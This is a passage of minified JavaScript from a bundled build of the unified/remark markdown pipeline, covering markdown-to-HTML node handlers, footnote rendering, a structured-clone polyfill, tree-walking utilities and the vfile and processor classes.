n=e[t];Array.isArray(n)?dM(a,n):tJ(a,n)}}function tJ(a,e){let t;for(t in e)if(uM.call(e,t))switch(t){case"canContainEols":{const n=e[t];n&&a[t].push(...n);break}case"transforms":{const n=e[t];n&&a[t].push(...n);break}case"enter":case"exit":{const n=e[t];n&&Object.assign(a[t],n);break}}}function UP(a,e){throw a?new Error("Cannot close `"+a.type+"` ("+qd({start:a.start,end:a.end})+"): a different token (`"+e.type+"`, "+qd({start:e.start,end:e.end})+") is open"):new Error("Cannot close document, a token (`"+e.type+"`, "+qd({start:e.start,end:e.end})+") is still open")}function nJ(a){const e=this;e.parser=t;function t(n){return eJ(n,{...e.data("settings"),...a,extensions:e.data("micromarkExtensions")||[],mdastExtensions:e.data("fromMarkdownExtensions")||[]})}}function iJ(a,e){const t={type:"element",tagName:"blockquote",properties:{},children:a.wrap(a.all(e),!0)};return a.patch(e,t),a.applyData(e,t)}function oJ(a,e){const t={type:"element",tagName:"br",properties:{},children:[]};return a.patch(e,t),[a.applyData(e,t),{type:"text",value:`
`}]}function sJ(a,e){const t=e.value?e.value+`
`:"",n={},i=e.lang?e.lang.split(/\s+/):[];i.length>0&&(n.className=["language-"+i[0]]);let r={type:"element",tagName:"code",properties:n,children:[{type:"text",value:t}]};return e.meta&&(r.data={meta:e.meta}),a.patch(e,r),r=a.applyData(e,r),r={type:"element",tagName:"pre",properties:{},children:[r]},a.patch(e,r),r}function rJ(a,e){const t={type:"element",tagName:"del",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function lJ(a,e){const t={type:"element",tagName:"em",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function cJ(a,e){const t=typeof a.options.clobberPrefix=="string"?a.options.clobberPrefix:"user-content-",n=String(e.identifier).toUpperCase(),i=Xc(n.toLowerCase()),r=a.footnoteOrder.indexOf(n);let l,u=a.footnoteCounts.get(n);u===void 0?(u=0,a.footnoteOrder.push(n),l=a.footnoteOrder.length):l=r+1,u+=1,a.footnoteCounts.set(n,u);const d={type:"element",tagName:"a",properties:{href:"#"+t+"fn-"+i,id:t+"fnref-"+i+(u>1?"-"+u:""),dataFootnoteRef:!0,ariaDescribedBy:["footnote-label"]},children:[{type:"text",value:String(l)}]};a.patch(e,d);const p={type:"element",tagName:"sup",properties:{},children:[d]};return a.patch(e,p),a.applyData(e,p)}function uJ(a,e){const t={type:"element",tagName:"h"+e.depth,properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function dJ(a,e){if(a.options.allowDangerousHtml){const t={type:"raw",value:e.value};return a.patch(e,t),a.applyData(e,t)}}function pM(a,e){const t=e.referenceType;let n="]";if(t==="collapsed"?n+="[]":t==="full"&&(n+="["+(e.label||e.identifier)+"]"),e.type==="imageReference")return[{type:"text",value:"!["+e.alt+n}];const i=a.all(e),r=i[0];r&&r.type==="text"?r.value="["+r.value:i.unshift({type:"text",value:"["});const l=i[i.length-1];return l&&l.type==="text"?l.value+=n:i.push({type:"text",value:n}),i}function pJ(a,e){const t=String(e.identifier).toUpperCase(),n=a.definitionById.get(t);if(!n)return pM(a,e);const i={src:Xc(n.url||""),alt:e.alt};n.title!==null&&n.title!==void 0&&(i.title=n.title);const r={type:"element",tagName:"img",properties:i,children:[]};return a.patch(e,r),a.applyData(e,r)}function mJ(a,e){const t={src:Xc(e.url)};e.alt!==null&&e.alt!==void 0&&(t.alt=e.alt),e.title!==null&&e.title!==void 0&&(t.title=e.title);const n={type:"element",tagName:"img",properties:t,children:[]};return a.patch(e,n),a.applyData(e,n)}function fJ(a,e){const t={type:"text",value:e.value.replace(/\r?\n|\r/g," ")};a.patch(e,t);const n={type:"element",tagName:"code",properties:{},children:[t]};return a.patch(e,n),a.applyData(e,n)}function hJ(a,e){const t=String(e.identifier).toUpperCase(),n=a.definitionById.get(t);if(!n)return pM(a,e);const i={href:Xc(n.url||"")};n.title!==null&&n.title!==void 0&&(i.title=n.title);const r={type:"element",tagName:"a",properties:i,children:a.all(e)};return a.patch(e,r),a.applyData(e,r)}function gJ(a,e){const t={href:Xc(e.url)};e.title!==null&&e.title!==void 0&&(t.title=e.title);const n={type:"element",tagName:"a",properties:t,children:a.all(e)};return a.patch(e,n),a.applyData(e,n)}function bJ(a,e,t){const n=a.all(e),i=t?vJ(t):mM(e),r={},l=[];if(typeof e.checked=="boolean"){const f=n[0];let h;f&&f.type==="element"&&f.tagName==="p"?h=f:(h={type:"element",tagName:"p",properties:{},children:[]},n.unshift(h)),h.children.length>0&&h.children.unshift({type:"text",value:" "}),h.children.unshift({type:"element",tagName:"input",properties:{type:"checkbox",checked:e.checked,disabled:!0},children:[]}),r.className=["task-list-item"]}let u=-1;for(;++u<n.length;){const f=n[u];(i||u!==0||f.type!=="element"||f.tagName!=="p")&&l.push({type:"text",value:`
`}),f.type==="element"&&f.tagName==="p"&&!i?l.push(...f.children):l.push(f)}const d=n[n.length-1];d&&(i||d.type!=="element"||d.tagName!=="p")&&l.push({type:"text",value:`
`});const p={type:"element",tagName:"li",properties:r,children:l};return a.patch(e,p),a.applyData(e,p)}function vJ(a){let e=!1;if(a.type==="list"){e=a.spread||!1;const t=a.children;let n=-1;for(;!e&&++n<t.length;)e=mM(t[n])}return e}function mM(a){const e=a.spread;return e??a.children.length>1}function yJ(a,e){const t={},n=a.all(e);let i=-1;for(typeof e.start=="number"&&e.start!==1&&(t.start=e.start);++i<n.length;){const l=n[i];if(l.type==="element"&&l.tagName==="li"&&l.properties&&Array.isArray(l.properties.className)&&l.properties.className.includes("task-list-item")){t.className=["contains-task-list"];break}}const r={type:"element",tagName:e.ordered?"ol":"ul",properties:t,children:a.wrap(n,!0)};return a.patch(e,r),a.applyData(e,r)}function EJ(a,e){const t={type:"element",tagName:"p",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function SJ(a,e){const t={type:"root",children:a.wrap(a.all(e))};return a.patch(e,t),a.applyData(e,t)}function CJ(a,e){const t={type:"element",tagName:"strong",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function TJ(a,e){const t=a.all(e),n=t.shift(),i=[];if(n){const l={type:"element",tagName:"thead",properties:{},children:a.wrap([n],!0)};a.patch(e.children[0],l),i.push(l)}if(t.length>0){const l={type:"element",tagName:"tbody",properties:{},children:a.wrap(t,!0)},u=uo(e.children[1]),d=fg(e.children[e.children.length-1]);u&&d&&(l.position={start:u,end:d}),i.push(l)}const r={type:"element",tagName:"table",properties:{},children:a.wrap(i,!0)};return a.patch(e,r),a.applyData(e,r)}function xJ(a,e,t){const n=t?t.children:void 0,r=(n?n.indexOf(e):1)===0?"th":"td",l=t&&t.type==="table"?t.align:void 0,u=l?l.length:e.children.length;let d=-1;const p=[];for(;++d<u;){const h=e.children[d],E={},C=l?l[d]:void 0;C&&(E.align=C);let A={type:"element",tagName:r,properties:E,children:[]};h&&(A.children=a.all(h),a.patch(h,A),A=a.applyData(h,A)),p.push(A)}const f={type:"element",tagName:"tr",properties:{},children:a.wrap(p,!0)};return a.patch(e,f),a.applyData(e,f)}function AJ(a,e){const t={type:"element",tagName:"td",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}const zP=9,BP=32;function PJ(a){const e=String(a),t=/\r?\n|\r/g;let n=t.exec(e),i=0;const r=[];for(;n;)r.push(FP(e.slice(i,n.index),i>0,!0),n[0]),i=n.index+n[0].length,n=t.exec(e);return r.push(FP(e.slice(i),i>0,!1)),r.join("")}function FP(a,e,t){let n=0,i=a.length;if(e){let r=a.codePointAt(n);for(;r===zP||r===BP;)n++,r=a.codePointAt(n)}if(t){let r=a.codePointAt(i-1);for(;r===zP||r===BP;)i--,r=a.codePointAt(i-1)}return i>n?a.slice(n,i):""}function LJ(a,e){const t={type:"text",value:PJ(String(e.value))};return a.patch(e,t),a.applyData(e,t)}function RJ(a,e){const t={type:"element",tagName:"hr",properties:{},children:[]};return a.patch(e,t),a.applyData(e,t)}const IJ={blockquote:iJ,break:oJ,code:sJ,delete:rJ,emphasis:lJ,footnoteReference:cJ,heading:uJ,html:dJ,imageReference:pJ,image:mJ,inlineCode:fJ,linkReference:hJ,link:gJ,listItem:bJ,list:yJ,paragraph:EJ,root:SJ,strong:CJ,table:TJ,tableCell:AJ,tableRow:xJ,text:LJ,thematicBreak:RJ,toml:Cf,yaml:Cf,definition:Cf,footnoteDefinition:Cf};function Cf(){}const fM=-1,bg=0,Od=1,jh=2,V1=3,H1=4,G1=5,Q1=6,hM=7,gM=8,VP=typeof self=="object"?self:globalThis,wJ=(a,e)=>{const t=(i,r)=>(a.set(r,i),i),n=i=>{if(a.has(i))return a.get(i);const[r,l]=e[i];switch(r){case bg:case fM:return t(l,i);case Od:{const u=t([],i);for(const d of l)u.push(n(d));return u}case jh:{const u=t({},i);for(const[d,p]of l)u[n(d)]=n(p);return u}case V1:return t(new Date(l),i);case H1:{const{source:u,flags:d}=l;return t(new RegExp(u,d),i)}case G1:{const u=t(new Map,i);for(const[d,p]of l)u.set(n(d),n(p));return u}case Q1:{const u=t(new Set,i);for(const d of l)u.add(n(d));return u}case hM:{const{name:u,message:d}=l;return t(new VP[u](d),i)}case gM:return t(BigInt(l),i);case"BigInt":return t(Object(BigInt(l)),i);case"ArrayBuffer":return t(new Uint8Array(l).buffer,l);case"DataView":{const{buffer:u}=new Uint8Array(l);return t(new DataView(u),l)}}return t(new VP[r](l),i)};return n},HP=a=>wJ(new Map,a)(0),sc="",{toString:jJ}={},{keys:DJ}=Object,pd=a=>{const e=typeof a;if(e!=="object"||!a)return[bg,e];const t=jJ.call(a).slice(8,-1);switch(t){case"Array":return[Od,sc];case"Object":return[jh,sc];case"Date":return[V1,sc];case"RegExp":return[H1,sc];case"Map":return[G1,sc];case"Set":return[Q1,sc];case"DataView":return[Od,t]}return t.includes("Array")?[Od,t]:t.includes("Error")?[hM,t]:[jh,t]},Tf=([a,e])=>a===bg&&(e==="function"||e==="symbol"),MJ=(a,e,t,n)=>{const i=(l,u)=>{const d=n.push(l)-1;return t.set(u,d),d},r=l=>{if(t.has(l))return t.get(l);let[u,d]=pd(l);switch(u){case bg:{let f=l;switch(d){case"bigint":u=gM,f=l.toString();break;case"function":case"symbol":if(a)throw new TypeError("unable to serialize "+d);f=null;break;case"undefined":return i([fM],l)}return i([u,f],l)}case Od:{if(d){let E=l;return d==="DataView"?E=new Uint8Array(l.buffer):d==="ArrayBuffer"&&(E=new Uint8Array(l)),i([d,[...E]],l)}const f=[],h=i([u,f],l);for(const E of l)f.push(r(E));return h}case jh:{if(d)switch(d){case"BigInt":return i([d,l.toString()],l);case"Boolean":case"Number":case"String":return i([d,l.valueOf()],l)}if(e&&"toJSON"in l)return r(l.toJSON());const f=[],h=i([u,f],l);for(const E of DJ(l))(a||!Tf(pd(l[E])))&&f.push([r(E),r(l[E])]);return h}case V1:return i([u,l.toISOString()],l);case H1:{const{source:f,flags:h}=l;return i([u,{source:f,flags:h}],l)}case G1:{const f=[],h=i([u,f],l);for(const[E,C]of l)(a||!(Tf(pd(E))||Tf(pd(C))))&&f.push([r(E),r(C)]);return h}case Q1:{const f=[],h=i([u,f],l);for(const E of l)(a||!Tf(pd(E)))&&f.push(r(E));return h}}const{message:p}=l;return i([u,{name:d,message:p}],l)};return r},GP=(a,{json:e,lossy:t}={})=>{const n=[];return MJ(!(e||t),!!e,new Map,n)(a),n},kc=typeof structuredClone=="function"?(a,e)=>e&&("json"in e||"lossy"in e)?HP(GP(a,e)):structuredClone(a):(a,e)=>HP(GP(a,e));function NJ(a,e){const t=[{type:"text",value:""}];return e>1&&t.push({type:"element",tagName:"sup",properties:{},children:[{type:"text",value:String(e)}]}),t}function _J(a,e){return"Back to reference "+(a+1)+(e>1?"-"+e:"")}function qJ(a){const e=typeof a.options.clobberPrefix=="string"?a.options.clobberPrefix:"user-content-",t=a.options.footnoteBackContent||NJ,n=a.options.footnoteBackLabel||_J,i=a.options.footnoteLabel||"Footnotes",r=a.options.footnoteLabelTagName||"h2",l=a.options.footnoteLabelProperties||{className:["sr-only"]},u=[];let d=-1;for(;++d<a.footnoteOrder.length;){const p=a.footnoteById.get(a.footnoteOrder[d]);if(!p)continue;const f=a.all(p),h=String(p.identifier).toUpperCase(),E=Xc(h.toLowerCase());let C=0;const A=[],j=a.footnoteCounts.get(h);for(;j!==void 0&&++C<=j;){A.length>0&&A.push({type:"text",value:" "});let w=typeof t=="string"?t:t(d,C);typeof w=="string"&&(w={type:"text",value:w}),A.push({type:"element",tagName:"a",properties:{href:"#"+e+"fnref-"+E+(C>1?"-"+C:""),dataFootnoteBackref:"",ariaLabel:typeof n=="string"?n:n(d,C),className:["data-footnote-backref"]},children:Array.isArray(w)?w:[w]})}const R=f[f.length-1];if(R&&R.type==="element"&&R.tagName==="p"){const w=R.children[R.children.length-1];w&&w.type==="text"?w.value+=" ":R.children.push({type:"text",value:" "}),R.children.push(...A)}else f.push(...A);const I={type:"element",tagName:"li",properties:{id:e+"fn-"+E},children:a.wrap(f,!0)};a.patch(p,I),u.push(I)}if(u.length!==0)return{type:"element",tagName:"section",properties:{dataFootnotes:!0,className:["footnotes"]},children:[{type:"element",tagName:r,properties:{...kc(l),id:"footnote-label"},children:[{type:"text",value:i}]},{type:"text",value:`
`},{type:"element",tagName:"ol",properties:{},children:a.wrap(u,!0)},{type:"text",value:`
`}]}}const vg=(function(a){if(a==null)return zJ;if(typeof a=="function")return yg(a);if(typeof a=="object")return Array.isArray(a)?kJ(a):OJ(a);if(typeof a=="string")return UJ(a);throw new Error("Expected function, string, or object as test")});function kJ(a){const e=[];let t=-1;for(;++t<a.length;)e[t]=vg(a[t]);return yg(n);function n(...i){let r=-1;for(;++r<e.length;)if(e[r].apply(this,i))return!0;return!1}}function OJ(a){const e=a;return yg(t);function t(n){const i=n;let r;for(r in a)if(i[r]!==e[r])return!1;return!0}}function UJ(a){return yg(e);function e(t){return t&&t.type===a}}function yg(a){return e;function e(t,n,i){return!!(BJ(t)&&a.call(this,t,typeof n=="number"?n:void 0,i||void 0))}}function zJ(){return!0}function BJ(a){return a!==null&&typeof a=="object"&&"type"in a}const bM=[],FJ=!0,R0=!1,VJ="skip";function vM(a,e,t,n){let i;typeof e=="function"&&typeof t!="function"?(n=t,t=e):i=e;const r=vg(i),l=n?-1:1;u(a,void 0,[])();function u(d,p,f){const h=d&&typeof d=="object"?d:{};if(typeof h.type=="string"){const C=typeof h.tagName=="string"?h.tagName:typeof h.name=="string"?h.name:void 0;Object.defineProperty(E,"name",{value:"node ("+(d.type+(C?"<"+C+">":""))+")"})}return E;function E(){let C=bM,A,j,R;if((!e||r(d,p,f[f.length-1]||void 0))&&(C=HJ(t(d,f)),C[0]===R0))return C;if("children"in d&&d.children){const I=d;if(I.children&&C[0]!==VJ)for(j=(n?I.children.length:-1)+l,R=f.concat(I);j>-1&&j<I.children.length;){const w=I.children[j];if(A=u(w,j,R)(),A[0]===R0)return A;j=typeof A[1]=="number"?A[1]:j+l}}return C}}}function HJ(a){return Array.isArray(a)?a:typeof a=="number"?[FJ,a]:a==null?bM:[a]}function Eg(a,e,t,n){let i,r,l;typeof e=="function"&&typeof t!="function"?(r=void 0,l=e,i=t):(r=e,l=t,i=n),vM(a,r,u,i);function u(d,p){const f=p[p.length-1],h=f?f.children.indexOf(d):void 0;return l(d,h,f)}}const I0={}.hasOwnProperty,GJ={};function QJ(a,e){const t=e||GJ,n=new Map,i=new Map,r=new Map,l={...IJ,...t.handlers},u={all:p,applyData:WJ,definitionById:n,footnoteById:i,footnoteCounts:r,footnoteOrder:[],handlers:l,one:d,options:t,patch:JJ,wrap:YJ};return Eg(a,function(f){if(f.type==="definition"||f.type==="footnoteDefinition"){const h=f.type==="definition"?n:i,E=String(f.identifier).toUpperCase();h.has(E)||h.set(E,f)}}),u;function d(f,h){const E=f.type,C=u.handlers[E];if(I0.call(u.handlers,E)&&C)return C(u,f,h);if(u.options.passThrough&&u.options.passThrough.includes(E)){if("children"in f){const{children:j,...R}=f,I=kc(R);return I.children=u.all(f),I}return kc(f)}return(u.options.unknownHandler||KJ)(u,f,h)}function p(f){const h=[];if("children"in f){const E=f.children;let C=-1;for(;++C<E.length;){const A=u.one(E[C],f);if(A){if(C&&E[C-1].type==="break"&&(!Array.isArray(A)&&A.type==="text"&&(A.value=QP(A.value)),!Array.isArray(A)&&A.type==="element")){const j=A.children[0];j&&j.type==="text"&&(j.value=QP(j.value))}Array.isArray(A)?h.push(...A):h.push(A)}}}return h}}function JJ(a,e){a.position&&(e.position=_7(a))}function WJ(a,e){let t=e;if(a&&a.data){const n=a.data.hName,i=a.data.hChildren,r=a.data.hProperties;if(typeof n=="string")if(t.type==="element")t.tagName=n;else{const l="children"in t?t.children:[t];t={type:"element",tagName:n,properties:{},children:l}}t.type==="element"&&r&&Object.assign(t.properties,kc(r)),"children"in t&&t.children&&i!==null&&i!==void 0&&(t.children=i)}return t}function KJ(a,e){const t=e.data||{},n="value"in e&&!(I0.call(t,"hProperties")||I0.call(t,"hChildren"))?{type:"text",value:e.value}:{type:"element",tagName:"div",properties:{},children:a.all(e)};return a.patch(e,n),a.applyData(e,n)}function YJ(a,e){const t=[];let n=-1;for(e&&t.push({type:"text",value:`
`});++n<a.length;)n&&t.push({type:"text",value:`
`}),t.push(a[n]);return e&&a.length>0&&t.push({type:"text",value:`
`}),t}function QP(a){let e=0,t=a.charCodeAt(e);for(;t===9||t===32;)e++,t=a.charCodeAt(e);return a.slice(e)}function JP(a,e){const t=QJ(a,e),n=t.one(a,void 0),i=qJ(t),r=Array.isArray(n)?{type:"root",children:n}:n||{type:"root",children:[]};return i&&r.children.push({type:"text",value:`
`},i),r}function $J(a,e){return a&&"run"in a?async function(t,n){const i=JP(t,{file:n,...e});await a.run(i,n)}:function(t,n){return JP(t,{file:n,...a||e})}}function WP(a){if(a)throw a}var ry,KP;function XJ(){if(KP)return ry;KP=1;var a=Object.prototype.hasOwnProperty,e=Object.prototype.toString,t=Object.defineProperty,n=Object.getOwnPropertyDescriptor,i=function(p){return typeof Array.isArray=="function"?Array.isArray(p):e.call(p)==="[object Array]"},r=function(p){if(!p||e.call(p)!=="[object Object]")return!1;var f=a.call(p,"constructor"),h=p.constructor&&p.constructor.prototype&&a.call(p.constructor.prototype,"isPrototypeOf");if(p.constructor&&!f&&!h)return!1;var E;for(E in p);return typeof E>"u"||a.call(p,E)},l=function(p,f){t&&f.name==="__proto__"?t(p,f.name,{enumerable:!0,configurable:!0,value:f.newValue,writable:!0}):p[f.name]=f.newValue},u=function(p,f){if(f==="__proto__")if(a.call(p,f)){if(n)return n(p,f).value}else return;return p[f]};return ry=function d(){var p,f,h,E,C,A,j=arguments[0],R=1,I=arguments.length,w=!1;for(typeof j=="boolean"&&(w=j,j=arguments[1]||{},R=2),(j==null||typeof j!="object"&&typeof j!="function")&&(j={});R<I;++R)if(p=arguments[R],p!=null)for(f in p)h=u(j,f),E=u(p,f),j!==E&&(w&&E&&(r(E)||(C=i(E)))?(C?(C=!1,A=h&&i(h)?h:[]):A=h&&r(h)?h:{},l(j,{name:f,newValue:d(w,A,E)})):typeof E<"u"&&l(j,{name:f,newValue:E}));return j},ry}var ZJ=XJ();const ly=pE(ZJ);function w0(a){if(typeof a!="object"||a===null)return!1;const e=Object.getPrototypeOf(a);return(e===null||e===Object.prototype||Object.getPrototypeOf(e)===null)&&!(Symbol.toStringTag in a)&&!(Symbol.iterator in a)}function eW(){const a=[],e={run:t,use:n};return e;function t(...i){let r=-1;const l=i.pop();if(typeof l!="function")throw new TypeError("Expected function as last argument, not "+l);u(null,...i);function u(d,...p){const f=a[++r];let h=-1;if(d){l(d);return}for(;++h<i.length;)(p[h]===null||p[h]===void 0)&&(p[h]=i[h]);i=p,f?aW(f,u)(...p):l(null,...p)}}function n(i){if(typeof i!="function")throw new TypeError("Expected `middelware` to be a function, not "+i);return a.push(i),e}}function aW(a,e){let t;return n;function n(...l){const u=a.length>l.length;let d;u&&l.push(i);try{d=a.apply(this,l)}catch(p){const f=p;if(u&&t)throw f;return i(f)}u||(d&&d.then&&typeof d.then=="function"?d.then(r,i):d instanceof Error?i(d):r(d))}function i(l,...u){t||(t=!0,e(l,...u))}function r(l){i(null,l)}}const Xi={basename:tW,dirname:nW,extname:iW,join:oW,sep:"/"};function tW(a,e){if(e!==void 0&&typeof e!="string")throw new TypeError('"ext" argument must be a string');qp(a);let t=0,n=-1,i=a.length,r;if(e===void 0||e.length===0||e.length>a.length){for(;i--;)if(a.codePointAt(i)===47){if(r){t=i+1;break}}else n<0&&(r=!0,n=i+1);return n<0?"":a.slice(t,n)}if(e===a)return"";let l=-1,u=e.length-1;for(;i--;)if(a.codePointAt(i)===47){if(r){t=i+1;break}}else l<0&&(r=!0,l=i+1),u>-1&&(a.codePointAt(i)===e.codePointAt(u--)?u<0&&(n=i):(u=-1,n=l));return t===n?n=l:n<0&&(n=a.length),a.slice(t,n)}function nW(a){if(qp(a),a.length===0)return".";let e=-1,t=a.length,n;for(;--t;)if(a.codePointAt(t)===47){if(n){e=t;break}}else n||(n=!0);return e<0?a.codePointAt(0)===47?"/":".":e===1&&a.codePointAt(0)===47?"//":a.slice(0,e)}function iW(a){qp(a);let e=a.length,t=-1,n=0,i=-1,r=0,l;for(;e--;){const u=a.codePointAt(e);if(u===47){if(l){n=e+1;break}continue}t<0&&(l=!0,t=e+1),u===46?i<0?i=e:r!==1&&(r=1):i>-1&&(r=-1)}return i<0||t<0||r===0||r===1&&i===t-1&&i===n+1?"":a.slice(i,t)}function oW(...a){let e=-1,t;for(;++e<a.length;)qp(a[e]),a[e]&&(t=t===void 0?a[e]:t+"/"+a[e]);return t===void 0?".":sW(t)}function sW(a){qp(a);const e=a.codePointAt(0)===47;let t=rW(a,!e);return t.length===0&&!e&&(t="."),t.length>0&&a.codePointAt(a.length-1)===47&&(t+="/"),e?"/"+t:t}function rW(a,e){let t="",n=0,i=-1,r=0,l=-1,u,d;for(;++l<=a.length;){if(l<a.length)u=a.codePointAt(l);else{if(u===47)break;u=47}if(u===47){if(!(i===l-1||r===1))if(i!==l-1&&r===2){if(t.length<2||n!==2||t.codePointAt(t.length-1)!==46||t.codePointAt(t.length-2)!==46){if(t.length>2){if(d=t.lastIndexOf("/"),d!==t.length-1){d<0?(t="",n=0):(t=t.slice(0,d),n=t.length-1-t.lastIndexOf("/")),i=l,r=0;continue}}else if(t.length>0){t="",n=0,i=l,r=0;continue}}e&&(t=t.length>0?t+"/..":"..",n=2)}else t.length>0?t+="/"+a.slice(i+1,l):t=a.slice(i+1,l),n=l-i-1;i=l,r=0}else u===46&&r>-1?r++:r=-1}return t}function qp(a){if(typeof a!="string")throw new TypeError("Path must be a string. Received "+JSON.stringify(a))}const lW={cwd:cW};function cW(){return"/"}function j0(a){return!!(a!==null&&typeof a=="object"&&"href"in a&&a.href&&"protocol"in a&&a.protocol&&a.auth===void 0)}function uW(a){if(typeof a=="string")a=new URL(a);else if(!j0(a)){const e=new TypeError('The "path" argument must be of type string or an instance of URL. Received `'+a+"`");throw e.code="ERR_INVALID_ARG_TYPE",e}if(a.protocol!=="file:"){const e=new TypeError("The URL must be of scheme file");throw e.code="ERR_INVALID_URL_SCHEME",e}return dW(a)}function dW(a){if(a.hostname!==""){const n=new TypeError('File URL host must be "localhost" or empty on darwin');throw n.code="ERR_INVALID_FILE_URL_HOST",n}const e=a.pathname;let t=-1;for(;++t<e.length;)if(e.codePointAt(t)===37&&e.codePointAt(t+1)===50){const n=e.codePointAt(t+2);if(n===70||n===102){const i=new TypeError("File URL path must not include encoded / characters");throw i.code="ERR_INVALID_FILE_URL_PATH",i}}return decodeURIComponent(e)}const cy=["history","path","basename","stem","extname","dirname"];class yM{constructor(e){let t;e?j0(e)?t={path:e}:typeof e=="string"||pW(e)?t={value:e}:t=e:t={},this.cwd="cwd"in t?"":lW.cwd(),this.data={},this.history=[],this.messages=[],this.value,this.map,this.result,this.stored;let n=-1;for(;++n<cy.length;){const r=cy[n];r in t&&t[r]!==void 0&&t[r]!==null&&(this[r]=r==="history"?[...t[r]]:t[r])}let i;for(i in t)cy.includes(i)||(this[i]=t[i])}get basename(){return typeof this.path=="string"?Xi.basename(this.path):void 0}set basename(e){dy(e,"basename"),uy(e,"basename"),this.path=Xi.join(this.dirname||"",e)}get dirname(){return typeof this.path=="string"?Xi.dirname(this.path):void 0}set dirname(e){YP(this.basename,"dirname"),this.path=Xi.join(e||"",this.basename)}get extname(){return typeof this.path=="string"?Xi.extname(this.path):void 0}set extname(e){if(uy(e,"extname"),YP(this.dirname,"extname"),e){if(e.codePointAt(0)!==46)throw new Error("`extname` must start with `.`");if(e.includes(".",1))throw new Error("`extname` cannot contain multiple dots")}this.path=Xi.join(this.dirname,this.stem+(e||""))}get path(){return this.history[this.history.length-1]}set path(e){j0(e)&&(e=uW(e)),dy(e,"path"),this.path!==e&&this.history.push(e)}get stem(){return typeof this.path=="string"?Xi.basename(this.path,this.extname):void 0}set stem(e){dy(e,"stem"),uy(e,"stem"),this.path=Xi.join(this.dirname||"",e+(this.extname||""))}fail(e,t,n){const i=this.message(e,t,n);throw i.fatal=!0,i}info(e,t,n){const i=this.message(e,t,n);return i.fatal=void 0,i}message(e,t,n){const i=new Jt(e,t,n);return this.path&&(i.name=this.path+":"+i.name,i.file=this.path),i.fatal=!1,this.messages.push(i),i}toString(e){return this.value===void 0?"":typeof this.value=="string"?this.value:new TextDecoder(e||void 0).decode(this.value)}}function uy(a,e){if(a&&a.includes(Xi.sep))throw new Error("`"+e+"` cannot be a path: did not expect `"+Xi.sep+"`")}function dy(a,e){if(!a)throw new Error("`"+e+"` cannot be empty")}function YP(a,e){if(!a)throw new Error("Setting `"+e+"` requires `path` to be set too")}function pW(a){return!!(a&&typeof a=="object"&&"byteLength"in a&&"byteOffset"in a)}const mW=(function(a){const n=this.constructor.prototype,i=n[a],r=function(){return i.apply(r,arguments)};return Object.setPrototypeOf(r,n),r}),fW={}.hasOwnProperty;class J1 extends mW{constructor(){super("copy"),this.Compiler=void 0,this.Parser=void 0,this.attachers=[],this.compiler=void 0,this.freezeIndex=-1,this.frozen=void 0,this.namespace={},this.parser=void 0,this.transformers=eW()}copy(){const e=new J1;let t=-1;for(;++t<this.attachers.length;){const n=this.attachers[t];e.use(...n)}return e.data(ly(!0,{},this.namespace)),e}data(e,t){return typeof e=="string"?arguments.length===2?(fy("data",this.frozen),this.namespace[e]=t,this):fW.call(this.namespace,e)&&this.namespace[e]||void 0:e?(fy("data",this.frozen),this.namespace=e,this):this.namespace}freeze(){if(this.frozen)return this;const e=this;for(;++this.freezeIndex<this.attachers.length;){const[t,...n]=this.attachers[this.freezeIndex];if(n[0]===!1)continue;n[0]===!0&&(n[0]=void 0);const i=t.call(e,...n);typeof i=="function"&&this.transformers.use(i)}return this.frozen=!0,this.freezeIndex=Number.POSITIVE_INFINITY,this}parse(e){this.freeze();const t=xf(e),n=this.parser||this.Parser;return py("parse",n),n(String(t),t)}process(e,t){const n=this;return this.freeze(),py("process",this.parser||this.Parser),my("process",this.compiler||this.Compiler),t?i(void 0,t):new Promise(i);function i(r,l){const u=xf(e),d=n.parse(u);n.run(d,u,function(f,h,E){if(f||!h||!E)return p(f);const C=h,A=n.stringify(C,E);bW(A)?E.value=A:E.result=A,p(f,E)});function p(f,h){f||!h?l(f):r?r(h):t(void 0,h)}}}processSync(e){let t=!1,n;return this.freeze(),py("processSync",this.parser||this.Parser),my("processSync",this.compiler||this.Compiler),this.process(e,i),XP("processSync","process",t),n;function i(r,l){t=!0,WP(r),n=l}}run(e,t,n){$P(e),this.freeze();const i=this.transformers;return!n&&typeof t=="function"&&(n=t,t=void 0),n?r(void 0,n):new Promise(r);function r(l,u){const d=xf(t);i.run(e,d,p);function p(f,h,E){const C=h||e;f?u(f):l?l(C):n(void 0,C,E)}}}runSync(e,t){let n=!1,i;return this.run(e,t,r),XP("runSync","run",n),i;function r(l,u){WP(l),i=u,n=!0}}stringify(e,t){this.freeze();const n=xf(t),i=this.compiler||this.Compiler;return my("stringify",i),$P(e),i(e,n)}use(e,...t){const n=this.attachers,i=this.namespace;if(fy("use",this.frozen),e!=null)if(typeof e=="function")d(e,t);else if(typeof e=="object")Array.isArray(e)?u(e):l(e);else throw new TypeError("Expected usable value, not `"+e+"`");return this;function r(p){if(typeof p=="function")d(p,[]);else if(typeof p=="object")if(Array.isArray(p)){const[f,...h]=p;d(f,h)}else l(p);else throw new TypeError("Expected usable value, not `"+p+"`")}function l(p){if(!("plugins"in p)&&!("settings"in p))throw new Error("Expected usable value but received an empty preset, which is probably a mistake: presets typically come with `plugins` and sometimes with `settings`, but this has neither");u(p.plugins),p.settings&&(i.settings=ly(!0,i.settings,p.settings))}function u(p){let f=-1;if(p!=null)if(Array.isArray(p))for(;++f<p.length;){const h=p[f];r(h)}else throw new TypeError("Expected a list of plugins, not `"+p+"`")}function d(p,f){let h=-1,E=-1;for(;++h<n.length;)if(n[h][0]===p){E=h;break}if(E===-1)n.push([p,...f]);else if(f.length>0){let[C,...A]=f;const j=n[E][1];w0(j)&&w0(C)&&(C=ly(!0,j,C)),n[E]=[p,C,...A]}}}}const hW=new J1().freeze();function py(a,e){if(typeof e!="function")throw new TypeError("Cannot `"+a+"` without `parser`")}function my(a,e){if(typeof e!="function")throw new TypeError("Cannot `"+a+"` without `compiler`")}function fy(a,e){if(e)throw new Error("Cannot call `"+a+"` on a frozen processor.\nCreate a new processor first, by calling it: use `processor()` instead of `processor`.")}function $P(a){if(!w0(a)||typeof a.type!="string")throw new TypeError("Expected node, got `"+a+"`")}function XP(a,e,t){if(!t)throw new Error("`"+a+"` finished async. Use `"+e+"` instead")}function xf(a){return gW(a)?a:new yM(a)}function 